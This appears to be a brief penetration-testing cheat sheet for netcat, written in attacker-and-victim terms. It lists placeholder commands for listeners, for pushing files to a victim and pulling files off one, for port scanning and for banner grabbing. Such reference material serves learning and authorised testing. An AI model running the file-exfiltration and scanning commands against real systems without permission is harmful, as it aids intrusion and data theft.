Netcat is a simple tool used to communicate over a given port between a client and a server on a network. The command can be used to send messages or files over tcp or udp. There must be a server listening and a client sending for successful communication. It can be used in conjunction with other utilities to provide a pipeline over which an exploit can be used or deeper discovery can be achieved.

## Start Listener on the Target

``nc -l -p [port]``

## Start Client on Kali

``nc [target_ip_address] [port]``

Now you can send text to the target console session

## Push file from attacker to victim

On Victim:

``nc -lvp [port] > [destination path]``

On Attacker:

``nc [victimip] [victimport] < [path and name of file]``

## Pull file from victim

On Victim:

``nc -l -p [port] < [path and filename]``

On Attacker:

``nc [victimip] [victimport] > [path and name of file]``

## Port Scanning

``nc -z -v [targetip] [port or port range]``

## Banner Grab

``nc [ipaddress] [port]``
